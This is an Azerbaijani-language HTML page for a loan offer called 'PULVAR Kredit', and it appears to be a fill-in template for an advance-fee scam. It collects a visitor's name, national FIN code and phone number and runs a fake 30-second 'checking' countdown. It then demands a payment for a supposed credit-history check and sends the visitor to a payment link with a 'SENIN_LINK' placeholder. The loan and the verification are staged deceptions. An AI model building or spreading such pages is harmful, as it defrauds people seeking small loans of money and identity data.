<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PULVAR Kredit</title>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#c40000;
  color:#fff;
}
.container{
  max-width:420px;
  margin:auto;
  padding:20px;
}
.logo{
  text-align:center;
  font-size:32px;
  font-weight:900;
}
.subtitle{
  text-align:center;
  margin-bottom:20px;
}
.card{
  background:#e10000;
  padding:20px;
  border-radius:25px;
}
.top{
  display:flex;
  justify-content:space-between;
  font-size:22px;
  font-weight:900;
}
input[type=range]{
  width:100%;
  margin:25px 0;
}
.row{
  display:flex;
  justify-content:space-between;
  padding:12px 0;
  border-top:2px solid #fff;
  font-weight:800;
}
.info{
  margin-top:15px;
  font-size:15px;
}
.btn{
  width:100%;
  margin-top:20px;
  padding:18px;
  border:none;
  border-radius:30px;
  font-size:22px;
  font-weight:900;
  background:linear-gradient(90deg,#d9ff00,#3fd6c4);
  color:#000;
}
.section{
  display:none;
  background:#fff;
  color:#000;
  padding:20px;
  border-radius:20px;
  margin-top:20px;
}
input{
  width:100%;
  padding:12px;
  margin:8px 0;
  border-radius:10px;
  border:1px solid #ccc;
}
.error{
  color:red;
  font-weight:700;
}
.wait{
  text-align:center;
  font-size:20px;
  font-weight:900;
}
.payBox{
  text-align:center;
}
.payBtn{
  margin-top:15px;
  padding:15px 25px;
  border:none;
  border-radius:12px;
  background:green;
  color:#fff;
  font-size:18px;
  font-weight:900;
}
</style>
</head>

<body>

<div class="container">

<div class="logo">PULVAR Kredit</div>
<div class="subtitle">Sürətli kredit müraciəti</div>

<div class="card">

<div class="top">
<span>Məbləği seçin</span>
<span><b id="amountText">20</b> ₼</span>
</div>

<input type="range" id="amount" min="20" max="220" step="10" value="20">

<div class="row">
<span>Kreditin məbləği</span>
<span><b id="amountResult">20</b> ₼</span>
</div>

<div class="row">
<span>Kreditin müddəti</span>
<span>45 gün</span>
</div>

<div class="row">
<span>Ödəniş tarixi</span>
<span id="date"></span>
</div>

<div class="info" id="tableInfo"></div>

<button class="btn" onclick="openForm()">Vəsait əldə etmək</button>

</div>

<!-- FORM -->
<div class="section" id="formBox">
<h3>Məlumatları daxil et</h3>
<input id="name" placeholder="Ad Soyad">
<input id="fin" placeholder="FIN kod">
<input id="phone" placeholder="Nömrə">
<button class="btn" onclick="checkForm()">Davam et</button>
<div class="error" id="error"></div>
</div>

<!-- WAIT -->
<div class="section wait" id="waitBox">
<p>Yoxlanılır...</p>
<p><span id="count">30</span> saniyə gözləyin</p>
</div>

<!-- PAYMENT -->
<div class="section payBox" id="payBox">
<h3>Hörmətli müştəri!</h3>
<p id="payText"></p>

<button class="payBtn" onclick="payNow()">
Ödəniş et
</button>
</div>

</div>

<script>
const amount = document.getElementById("amount");
const amountText = document.getElementById("amountText");
const amountResult = document.getElementById("amountResult");
const tableInfo = document.getElementById("tableInfo");

function calc(){
  let val = parseInt(amount.value);

  amountText.innerText = val;
  amountResult.innerText = val;

  let f15 = Math.round(val * 0.15);
  let f25 = Math.round(val * 0.20);
  let f35 = Math.round(val * 0.25);
  let f45 = Math.round(val * 0.30);

  tableInfo.innerHTML = `
  15 gün: ${f15} ₼ (Ümumi: ${val+f15} ₼)<br>
  25 gün: ${f25} ₼ (Ümumi: ${val+f25} ₼)<br>
  35 gün: ${f35} ₼ (Ümumi: ${val+f35} ₼)<br>
  45 gün: ${f45} ₼ (Ümumi: ${val+f45} ₼)
  `;
}

amount.oninput = calc;
calc();

// tarix
let d = new Date();
d.setDate(d.getDate()+45);
document.getElementById("date").innerText =
d.toLocaleDateString("az-AZ");

// FORM
function openForm(){
  document.getElementById("formBox").style.display="block";
}

// CHECK
function checkForm(){
  let name = document.getElementById("name").value.trim();
  let fin = document.getElementById("fin").value.trim();
  let phone = document.getElementById("phone").value.trim();
  let error = document.getElementById("error");

  error.innerText="";

  if(name.length < 5 || !name.includes(" ")){
    error.innerText="Ad soyadı düzgün yaz!";
    return;
  }

  if(fin.length < 6){
    error.innerText="FIN səhvdir!";
    return;
  }

  if(phone.length < 9){
    error.innerText="Nömrə səhvdir!";
    return;
  }

  document.getElementById("formBox").style.display="none";
  document.getElementById("waitBox").style.display="block";

  let sec = 30;
  let count = document.getElementById("count");

  let timer = setInterval(()=>{
    sec--;
    count.innerText = sec;

    if(sec == 0){
      clearInterval(timer);

      document.getElementById("waitBox").style.display="none";
      document.getElementById("payBox").style.display="block";

      document.getElementById("payText").innerHTML =
      name + ", kredit tarixçənizin yoxlanılması üçün ödəniş tələb olunur.";
    }

  },1000);
}

// PAYMENT
function payNow(){
  window.location.href = "https://epoint.az/pay/SENIN_LINK";
}
</script>

</body>
</html>
